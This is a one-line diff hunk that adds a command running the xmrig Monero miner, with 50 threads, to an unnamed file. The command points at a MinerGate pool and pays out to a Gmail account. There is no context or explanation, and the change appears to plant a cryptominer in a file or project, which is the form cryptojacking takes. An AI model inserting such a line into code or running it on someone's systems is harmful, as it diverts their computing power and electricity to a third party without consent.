@@ -1,0 +1,1 @@
+xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u bugfdu1@gmail.com -p x -t50
